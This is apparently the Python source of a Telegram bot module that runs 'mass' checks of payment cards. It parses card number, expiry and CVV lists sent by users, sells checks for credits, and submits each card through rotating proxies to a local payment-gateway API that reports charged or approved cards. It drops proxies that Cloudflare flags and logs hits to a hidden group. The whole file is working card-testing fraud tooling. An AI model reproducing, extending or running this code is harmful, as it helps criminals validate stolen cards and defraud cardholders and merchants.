import asyncio
import re
import time
import random
import os
import json
import itertools
import threading
import urllib.request
import urllib.parse
from datetime import datetime

from aiogram import types, F, Router

from database import is_gate_enabled, get_user_credits, is_owner_user
from sub import get_premium_status
from proxy_pool import get_user_proxies
from proxy import parse_proxy_input
from bms_proxy_pool import load_bms_proxies, prune_bms_proxy, prune_and_notify, OWNER_ID


def _norm_proxy(proxy):
    try:
        parsed = parse_proxy_input(proxy)
        if parsed and parsed.get("url_format"):
            return parsed["url_format"]
    except Exception:
        pass
    return proxy
from mass_gates._batch_common import show_selection, handle_result_callback, handle_stop_callback, GATE_GROUP_LOG

# silent group log for BMS hits (charged -> this group + pinned)
BMS_GROUP_ID = -1004453592223
GATE_GROUP_LOG["mb"] = BMS_GROUP_ID
from mass_gates._tg_helpers import safe_reply

router = Router()

# ── BMS (payu3) API (local) ────────────────────────────────────────────
BMS_API = "http://127.0.0.1:9400"

# ── MinecraftEnchanted custom emoji IDs (unique to BMS) ────────────────
EMOJI_STAR    = "5321214486877609476"   # ⭐️
EMOJI_BRONZE  = "5323735005615136620"   # 🥉
EMOJI_AXE     = "5323436380834016178"   # 🪓
EMOJI_TARGET  = "5323410860138343577"   # 🎯
EMOJI_BOW     = "5323400479202387128"   # 🏹
EMOJI_COMPASS = "5323308163175327669"   # 🧭

_notify_bot = None
_notify_loop = None


def _set_notify(bot, loop):
    global _notify_bot, _notify_loop
    _notify_bot = bot
    _notify_loop = loop


def _flag_dm(proxy):
    _notify_dev(
        "🚨 <b>𝐁𝐌𝐒 𝐏𝐫𝐨𝐱𝐲 𝐅𝐥𝐚𝐠𝐠𝐞𝐝 + 𝐑𝐞𝐦𝐨𝐯𝐞𝐝</b> 🚨\n"
        f"🧭 <b>𝐏𝐫𝐨𝐱𝐲</b> ➠ <code>{proxy}</code>"
    )


def _notify_dev(text):
    global _notify_bot, _notify_loop
    if _notify_bot and _notify_loop:
        import asyncio as _aio
        try:
            _aio.run_coroutine_threadsafe(_notify_bot.send_message(OWNER_ID, text, parse_mode="HTML"), _notify_loop)
        except Exception:
            pass


_STOP_EVENT = threading.Event()
MAX_VALID_CARDS = 5000
MB_WORKERS = int(os.environ.get("MB_WORKERS", "20"))   # per-user BMS worker cap


def stop_all():
    _STOP_EVENT.set()


_proxies = []
_proxy_ctr = itertools.count()
_proxy_paused_until = {}
_guard = threading.Lock()


def _next_proxy():
    global _proxies
    if not _proxies:
        return None
    now = time.time()
    for _ in range(len(_proxies)):
        cand = _proxies[next(_proxy_ctr) % len(_proxies)]
        if _proxy_paused_until.get(cand, 0) <= now:
            return cand
    return _proxies[next(_proxy_ctr) % len(_proxies)]


def _pause_proxy(proxy, seconds):
    with _guard:
        _proxy_paused_until[proxy] = time.time() + seconds


def luhn_check(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    rd = card_number[::-1]
    for i, ch in enumerate(rd):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def is_expired(mm, yy):
    try:
        now = datetime.now()
        cy = now.year % 100
        cm = now.month
        ey, em = int(yy), int(mm)
        return ey < cy or (ey == cy and em < cm)
    except Exception:
        return False


def extract_cards(text):
    pattern = r'(\d{13,19})\s*[|/\\:\s]\s*(\d{1,2})\s*[|/\\:\s]\s*(\d{2,4})\s*[|/\\:\s]\s*(\d{3,4})'
    cards = []
    for m in re.findall(pattern, text):
        cc, mm, yy, cvv = m
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards


def check_fn(card):
    """Sync single-card check against the BMS API. Returns
    (status, msg, brand, amount, real_response)."""
    if _STOP_EVENT.is_set():
        return "STOPPED", "Stopped", "UNKNOWN", 0, ""
    proxy = _next_proxy()
    if proxy is None:
        # all proxies dead mid-check -> stop immediately + tell the dev
        _STOP_EVENT.set()
        _notify_dev(
            "🛑 <b>𝐁𝐌𝐒 𝐏𝐫𝐨𝐱𝐲 𝐏𝐨𝐨𝐥 𝐄𝐦𝐩𝐭𝐲</b> 🛑\n"
            "🧭 𝐌𝐚𝐬𝐬 𝐜𝐡𝐞𝐜𝐤 𝐬𝐭𝐨𝐩𝐩𝐞𝐝 — 𝐚𝐝𝐝 𝐩𝐫𝐨𝐱𝐲 𝐭𝐨 𝐛𝐦𝐬 𝐩𝐨𝐨𝐥."
        )
        return "STOPPED", "proxy pool empty", "UNKNOWN", 0, ""
    proxy = _norm_proxy(proxy)
    try:
        _opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        _r = _opener.open("http://api.ipify.org", timeout=12)
        if "bandwidth" in _r.read().decode("utf-8", "ignore").lower():
            prune_bms_proxy(proxy)
            _pause_proxy(proxy, 3600)
            return "ERROR", "Bandwidth limit", "UNKNOWN", 0, ""
    except Exception:
        pass
    try:
        q = urllib.parse.urlencode({"cc": card, "proxy": proxy, "key": "ladle"})
        url = f"{BMS_API}/bms?{q}"
        resp = urllib.request.urlopen(url, timeout=300)
        data = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read().decode())
        except Exception:
            data = {}
    except Exception as e:
        _pause_proxy(proxy, random.randint(60, 180))
        return "ERROR", f"API: {str(e)[:60]}", "UNKNOWN", 0, ""

    response_code = str(data.get("response_code") or data.get("response") or "ERROR").upper()
    status = str(data.get("response") or "error").lower()   # CHARGED/APPROVED/DECLINED/ERROR
    real = str(data.get("real_response") or "N/A")
    amount_str = str(data.get("amount") or "0.00")

    if response_code in ("CLOUDFLARE_BLOCKED", "PROXY_ERROR"):
        # flagged by Cloudflare -> drop from bms_proxy.txt + DM dev
        prune_bms_proxy(proxy)
        _flag_dm(proxy)
        _pause_proxy(proxy, 3600)

    if "proxy" in response_code.lower() or ("error" in status and "proxy" in real.lower()):
        _pause_proxy(proxy, random.randint(60, 180))

    if status == "charged":
        return "CHARGED", response_code, "CHARGED", amount_str, real
    if status == "approved":
        # live-but-3DS or approved -> the "approved" bucket
        return "APPROVED", response_code, "APPROVED", amount_str, real
    if status == "declined":
        return "DECLINED", response_code, "UNKNOWN", amount_str, real
    return "ERROR", response_code, "UNKNOWN", amount_str, real


@router.message(F.text.startswith("/bms_txt") | F.caption.startswith("/bms_txt"))
async def bms_txt_command(message: types.Message):
    global _proxies
    _STOP_EVENT.clear()

    if not await asyncio.to_thread(is_gate_enabled, "mb"):
        await safe_reply(message, f'<tg-emoji emoji-id="{EMOJI_AXE}">🪓</tg-emoji> <b>𝗕𝗠𝗦 𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>', parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text:
            raw_text += rm.text + " "
        elif rm.caption:
            raw_text += rm.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document
    if document:
        try:
            fi = await message.bot.get_file(document.file_id)
            data = await message.bot.download_file(fi.file_path)
            raw_text += data.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await safe_reply(message, f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await safe_reply(message,
            f'<tg-emoji emoji-id="{EMOJI_BOW}">🏹</tg-emoji> <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n'
            "• <code>/bms_txt cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/bms_txt</code>\n"
            "• Send .txt file with <code>/bms_txt</code>",
            parse_mode="HTML")
        return

    extracted = extract_cards(raw_text)
    valid = []
    for c in extracted:
        cc, mm, yy, cvv = c.split('|')
        if luhn_check(cc) and not is_expired(mm, yy):
            valid.append(c)
        if len(valid) >= MAX_VALID_CARDS:
            break

    if not valid:
        await safe_reply(message, "❌ No valid cards to check.", parse_mode="HTML")
        return

    _set_notify(message.bot, asyncio.get_event_loop())
    _proxies = load_bms_proxies()  # ONLY the generated bms_proxy.txt pool
    if not _proxies:
        await safe_reply(message,
            f'<tg-emoji emoji-id="{EMOJI_COMPASS}">🧭</tg-emoji> <b>𝗣𝗿𝗼𝘅𝘆 𝗽𝗼𝗼𝗹 𝗲𝗺𝗽𝘁𝘆</b>\n\n'
            "𝗣𝗹𝗲𝗮𝘀𝗲 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝘆 — <code>/addbms</code> 𝗼𝗿 <code>/genproxy</code>.",
            parse_mode="HTML")
        return

    total = len(valid)
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total:
        await safe_reply(message,
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total}</b> credits to check <b>{total}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.",
            parse_mode="HTML")
        return

    plan_name = "OWNER" if is_owner_user(user_id) else ("PREMIUM" if is_premium else "FREE")

    await show_selection(
        message, valid, check_fn,
        "𝐁𝐌𝐒 𝐌𝐚𝐬𝐬",
        user_id, user, "mb", plan_name,
        max_workers=MB_WORKERS,
    )


@router.callback_query(F.data.startswith("mb_res_"))
async def mb_result(callback: types.CallbackQuery):
    await handle_result_callback(callback)


@router.callback_query(F.data.startswith("mb_stop_"))
async def mb_stop(callback: types.CallbackQuery):
    await handle_stop_callback(callback)
